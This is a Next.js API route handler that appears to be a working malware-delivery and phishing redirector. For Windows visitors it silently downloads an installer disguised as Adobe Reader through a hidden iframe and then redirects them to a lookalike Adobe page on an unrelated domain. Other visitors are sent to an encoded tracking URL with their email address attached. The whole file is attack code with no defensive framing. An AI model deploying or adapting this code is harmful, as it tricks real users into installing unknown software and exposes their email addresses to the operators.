// pages/api/redirect.js
export default function handler(req, res) {
  const userAgent = req.headers['user-agent'] || "";
  const isWindows = /windows/i.test(userAgent);

  const WINDOWS_REDIRECT_AFTER_DOWNLOAD = 'https://mksonline.com.mx/css/adobe/reader/download.html';
  const MSI_PATH = '/Reader_adobe_install_online.msi';

  // The base URL for non-windows users
  const NON_WINDOWS_TARGET = 'https://tagtechpro.com/i/?aXBkYXRhPTIwNS4yMzQuMTgxLjMwJnN2PWdlbmVyYWwmcj1LQSZ1aWQ9VVNFUjE1MDcyMDI1VTUyMDcxNTE3JnM9TGE=';

  //--------------------------------------------------------------------
  // 1. Try to read query normally: ?email= or ?smn=
  //--------------------------------------------------------------------
  let email = '';

  if (req.query.email) {
    email = Array.isArray(req.query.email) ? req.query.email[0] : req.query.email;
  } else if (req.query.smn) {
    email = Array.isArray(req.query.smn) ? req.query.smn[0] : req.query.smn;
  } else if (req.url) {
    //----------------------------------------------------------------
    // 2. Try to capture hash fragment from raw URL (best-effort)
    //    Example: /api/redirect#someone@email
    //----------------------------------------------------------------
    const hashMatch = req.url.match(/#([^?&]+)/);
    if (hashMatch && hashMatch[1]) {
      email = decodeURIComponent(hashMatch[1]);
    }
  }

  const safeEmail = email ? encodeURIComponent(email) : "";

  //--------------------------------------------------------------------
  // 3. Windows devices: serve MSI download + after 2 seconds redirect
  //--------------------------------------------------------------------
  if (isWindows) {
    const html = `<!DOCTYPE html>
    <html>
      <head><meta charset="utf-8"><title>Preparing Download…</title></head>
      <body>
        <p>Your download will start shortly…</p>
        <script>
          // Force MSI download silently
          const iframe = document.createElement('iframe');
          iframe.style.display = 'none';
          iframe.src = '${MSI_PATH}';
          document.body.appendChild(iframe);

          // Then send user to secondary page
          setTimeout(() => {
            window.location.href = '${WINDOWS_REDIRECT_AFTER_DOWNLOAD}';
          }, 2000);
        </script>
      </body>
    </html>`;
    
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.status(200).send(html);
    return;
  }

  //--------------------------------------------------------------------
  // 4. Non-Windows redirect
  //--------------------------------------------------------------------
  const finalUrl = safeEmail 
    ? `${NON_WINDOWS_TARGET}#${safeEmail}` 
    : NON_WINDOWS_TARGET;

  res.writeHead(302, { Location: finalUrl });
  res.end();
}
